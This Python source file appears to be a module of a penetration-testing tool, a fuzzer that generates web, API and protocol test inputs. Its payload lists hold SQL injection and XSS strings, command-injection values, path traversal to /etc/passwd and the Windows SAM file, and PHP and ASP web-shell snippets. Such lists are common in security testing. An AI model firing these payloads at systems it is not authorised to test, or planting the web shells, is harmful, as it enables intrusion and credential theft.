"""
Intelligent Fuzzing System
API fuzzing inteligente, protocol fuzzing, mutation-based fuzzing

Meowware v17.0 - Developed by Carlos Mancera
"""
import random
import string
import re
from typing import List, Dict, Any, Optional
from ..core.models import Host
from ..core.debug import debug_print

class IntelligentFuzzer:
    """
    Intelligent fuzzing based on context:
    - API fuzzing
    - Protocol fuzzing
    - Mutation-based fuzzing
    - Grammar-based fuzzing
    """
    
    def __init__(self):
        self.common_payloads = self._load_common_payloads()
        self.api_patterns = self._load_api_patterns()
    
    def _load_common_payloads(self) -> Dict[str, List[str]]:
        """Load common fuzzing payloads"""
        return {
            "sql_injection": [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "1' AND '1'='1",
                "admin'--",
                "' OR 1=1--"
            ],
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)"
            ],
            "command_injection": [
                "; id",
                "| id",
                "|| id",
                "&& id",
                "`id`",
                "$(id)"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//etc/passwd"
            ],
            "file_upload": [
                "<?php system($_GET['cmd']); ?>",
                "<% Response.Write(Request.Item('cmd')) %>",
                "#!/bin/bash\nid"
            ]
        }
    
    def _load_api_patterns(self) -> Dict[str, List[str]]:
        """Load API-specific patterns"""
        return {
            "rest": [
                "/api/v1/users",
                "/api/v1/users/{id}",
                "/api/v1/users/{id}/posts",
                "/api/v1/auth/login",
                "/api/v1/auth/register"
            ],
            "graphql": [
                "query { users { id name } }",
                "mutation { createUser(name: \"test\") { id } }",
                "{ __schema { types { name } } }"
            ],
            "soap": [
                "<soap:Envelope>...</soap:Envelope>",
                "<soap:Body>...</soap:Body>"
            ]
        }
    
    def intelligent_fuzz(self, target: str, context: Dict[str, Any], 
                        fuzz_type: str = "auto") -> List[Dict[str, Any]]:
        """
        Intelligent fuzzing based on context.
        """
        debug_print(f"    [Intelligent Fuzzer] Fuzzing {target} with type: {fuzz_type}")
        
        if fuzz_type == "auto":
            fuzz_type = self._detect_fuzz_type(context)
        
        if fuzz_type == "api":
            return self._api_fuzzing(target, context)
        elif fuzz_type == "protocol":
            return self._protocol_fuzzing(target, context)
        elif fuzz_type == "mutation":
            return self._mutation_fuzzing(target, context)
        else:
            return self._web_fuzzing(target, context)
    
    def _detect_fuzz_type(self, context: Dict[str, Any]) -> str:
        """Detect fuzz type from context"""
        if context.get("api_detected"):
            return "api"
        elif context.get("protocol"):
            return "protocol"
        elif context.get("mutation_required"):
            return "mutation"
        else:
            return "web"
    
    def _api_fuzzing(self, target: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """API-specific intelligent fuzzing"""
        results = []
        api_type = context.get("api_type", "rest")
        
        # Get API patterns
        patterns = self.api_patterns.get(api_type, [])
        
        # Generate fuzzing payloads
        for pattern in patterns:
            # Fuzz parameters
            fuzzed = self._fuzz_api_pattern(pattern, context)
            results.append({
                "type": "api",
                "endpoint": fuzzed,
                "method": context.get("method", "GET"),
                "payload": self._generate_api_payload(api_type, context)
            })
        
        # Add common API vulnerabilities
        for vuln_type, payloads in self.common_payloads.items():
            for payload in payloads[:3]:  # Top 3 per type
                results.append({
                    "type": "api_vulnerability",
                    "vulnerability": vuln_type,
                    "payload": payload,
                    "endpoint": target
                })
        
        debug_print(f"      ✓ Generated {len(results)} API fuzzing payloads")
        return results
    
    def _fuzz_api_pattern(self, pattern: str, context: Dict[str, Any]) -> str:
        """Fuzz API pattern with mutations"""
        fuzzed = pattern
        
        # Replace {id} with fuzzed values
        if "{id}" in fuzzed:
            fuzzed = fuzzed.replace("{id}", self._generate_id_mutation())
        
        # Add path traversal
        if random.random() > 0.7:
            fuzzed += "/../"
        
        # Add parameter pollution
        if "?" not in fuzzed:
            fuzzed += "?id=1&id=2"
        
        return fuzzed
    
    def _generate_id_mutation(self) -> str:
        """Generate mutated ID values"""
        mutations = [
            "-1",
            "0",
            "999999",
            "null",
            "undefined",
            "true",
            "false",
            "' OR '1'='1",
            "../../../etc/passwd"
        ]
        return random.choice(mutations)
    
    def _generate_api_payload(self, api_type: str, context: Dict[str, Any]) -> Dict[str, Any]:
        """Generate API payload based on type"""
        if api_type == "rest":
            return {
                "id": self._generate_id_mutation(),
                "name": "<script>alert(1)</script>",
                "email": "test' OR '1'='1@test.com"
            }
        elif api_type == "graphql":
            return {
                "query": "{ users { id name } }",
                "variables": {"id": self._generate_id_mutation()}
            }
        else:
            return {"data": self._generate_random_string()}
    
    def _protocol_fuzzing(self, target: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Protocol-specific fuzzing"""
        results = []
        protocol = context.get("protocol", "http")
        
        # Protocol-specific payloads
        if protocol == "http":
            results.extend(self._http_protocol_fuzzing(target, context))
        elif protocol == "ftp":
            results.extend(self._ftp_protocol_fuzzing(target, context))
        elif protocol == "smtp":
            results.extend(self._smtp_protocol_fuzzing(target, context))
        
        debug_print(f"      ✓ Generated {len(results)} protocol fuzzing payloads")
        return results
    
    def _http_protocol_fuzzing(self, target: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """HTTP protocol fuzzing"""
        results = []
        
        # HTTP method fuzzing
        methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "CONNECT"]
        for method in methods:
            results.append({
                "type": "http_method",
                "method": method,
                "target": target
            })
        
        # HTTP header fuzzing
        headers = [
            "X-Forwarded-For: 127.0.0.1",
            "X-Real-IP: 127.0.0.1",
            "X-Originating-IP: 127.0.0.1",
            "X-Remote-IP: 127.0.0.1",
            "X-Forwarded-Host: evil.com"
        ]
        for header in headers:
            results.append({
                "type": "http_header",
                "header": header,
                "target": target
            })
        
        return results
    
    def _ftp_protocol_fuzzing(self, target: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """FTP protocol fuzzing"""
        results = []
        
        # FTP command fuzzing
        commands = [
            "USER anonymous",
            "PASS anonymous",
            "CWD /",
            "PWD",
            "LIST",
            "RETR /etc/passwd",
            "STOR test.txt"
        ]
        
        for cmd in commands:
            results.append({
                "type": "ftp_command",
                "command": cmd,
                "target": target
            })
        
        return results
    
    def _smtp_protocol_fuzzing(self, target: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """SMTP protocol fuzzing"""
        results = []
        
        # SMTP command fuzzing
        commands = [
            "EHLO test",
            "MAIL FROM: <test@test.com>",
            "RCPT TO: <victim@test.com>",
            "DATA",
            "Subject: Test",
            "."
        ]
        
        for cmd in commands:
            results.append({
                "type": "smtp_command",
                "command": cmd,
                "target": target
            })
        
        return results
    
    def _mutation_fuzzing(self, target: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Mutation-based fuzzing"""
        results = []
        base_payload = context.get("base_payload", target)
        
        # Generate mutations
        mutations = [
            self._bit_flip_mutation,
            self._byte_flip_mutation,
            self._arithmetic_mutation,
            self._insertion_mutation,
            self._deletion_mutation,
            self._replacement_mutation
        ]
        
        for mutation_func in mutations:
            mutated = mutation_func(base_payload)
            if mutated:
                results.append({
                    "type": "mutation",
                    "technique": mutation_func.__name__,
                    "original": base_payload,
                    "mutated": mutated
                })
        
        debug_print(f"      ✓ Generated {len(results)} mutation-based payloads")
        return results
    
    def _bit_flip_mutation(self, payload: str) -> Optional[str]:
        """Bit flip mutation"""
        if not payload:
            return None
        try:
            byte_array = bytearray(payload.encode())
            if byte_array:
                byte_array[0] ^= 1  # Flip first bit
                return byte_array.decode('utf-8', errors='ignore')
        except:
            pass
        return None
    
    def _byte_flip_mutation(self, payload: str) -> Optional[str]:
        """Byte flip mutation"""
        if not payload:
            return None
        try:
            byte_array = bytearray(payload.encode())
            if len(byte_array) > 0:
                byte_array[0] = (byte_array[0] + 1) % 256
                return byte_array.decode('utf-8', errors='ignore')
        except:
            pass
        return None
    
    def _arithmetic_mutation(self, payload: str) -> Optional[str]:
        """Arithmetic mutation"""
        # Find numbers and mutate them
        numbers = re.findall(r'\d+', payload)
        if numbers:
            mutated = payload
            for num in numbers[:3]:  # Mutate first 3 numbers
                new_num = str(int(num) + random.randint(-100, 100))
                mutated = mutated.replace(num, new_num, 1)
            return mutated
        return None
    
    def _insertion_mutation(self, payload: str) -> Optional[str]:
        """Insertion mutation"""
        if not payload:
            return None
        insert_pos = random.randint(0, len(payload))
        insert_char = random.choice(string.ascii_letters + string.digits)
        return payload[:insert_pos] + insert_char + payload[insert_pos:]
    
    def _deletion_mutation(self, payload: str) -> Optional[str]:
        """Deletion mutation"""
        if len(payload) <= 1:
            return None
        delete_pos = random.randint(0, len(payload) - 1)
        return payload[:delete_pos] + payload[delete_pos + 1:]
    
    def _replacement_mutation(self, payload: str) -> Optional[str]:
        """Replacement mutation"""
        if not payload:
            return None
        replace_pos = random.randint(0, len(payload) - 1)
        replace_char = random.choice(string.ascii_letters + string.digits)
        return payload[:replace_pos] + replace_char + payload[replace_pos + 1:]
    
    def _web_fuzzing(self, target: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generic web fuzzing"""
        results = []
        
        # Combine all payload types
        for vuln_type, payloads in self.common_payloads.items():
            for payload in payloads:
                results.append({
                    "type": "web",
                    "vulnerability": vuln_type,
                    "payload": payload,
                    "target": target
                })
        
        debug_print(f"      ✓ Generated {len(results)} web fuzzing payloads")
        return results
    
    def _generate_random_string(self, length: int = 10) -> str:
        """Generate random string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


